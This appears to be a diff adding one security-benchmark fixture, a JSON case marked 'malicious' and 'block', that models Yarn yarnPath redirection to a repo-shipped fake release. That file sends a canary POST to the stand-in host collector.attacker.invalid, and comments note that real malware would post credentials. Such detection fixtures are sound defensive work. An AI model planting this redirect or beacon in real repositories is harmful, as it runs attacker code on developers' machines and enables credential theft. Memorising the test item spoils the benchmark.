@@ -1,0 +1,21 @@
+{
+  "id": "yarnrc-yarnpath-repo-script",
+  "title": ".yarnrc.yml yarnPath points at a script inside the repo",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "yarnPath makes Yarn execute a JavaScript file shipped in the repo instead of a trusted Yarn release, so any `yarn` command runs attacker code.",
+  "trigger": "Any yarn command in the repo",
+  "incident": "Yarn yarnPath redirection (self-hosted binary abuse, registry-redirect class)",
+  "sources": [
+    "https://arxiv.org/abs/2607.15143",
+    "https://socket.dev/glossary/shai-hulud"
+  ],
+  "notes": "The pinned release only beacons the canary; reserved .invalid collector, never executed.",
+  "files": {
+    ".yarnrc.yml": "yarnPath: .yarn/releases/yarn-3.6.0.cjs\n",
+    ".yarn/releases/yarn-3.6.0.cjs": "// PAH-CANARY fixture: a fake pinned Yarn release. Inert.\n// PAH-CANARY benchmark fixture -- inert stand-in for an install-time beacon.\n// Real malware would read local credentials and POST them to the collector;\n// this fixture only sends the canary marker to a reserved .invalid host.\ntry {\n  const https = require('https');\n  const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n  req.on('error', () => {});\n  req.write('marker=PAH-CANARY');\n  req.end();\n} catch (e) {}\nconsole.log('PAH-CANARY');\n",
+    "package.json": "{\n  \"name\": \"web\",\n  \"version\": \"1.0.0\",\n  \"packageManager\": \"yarn@3.6.0\"\n}\n",
+    "README.md": "# web\n\nWeb app. Uses Yarn.\n"
+  }
+}
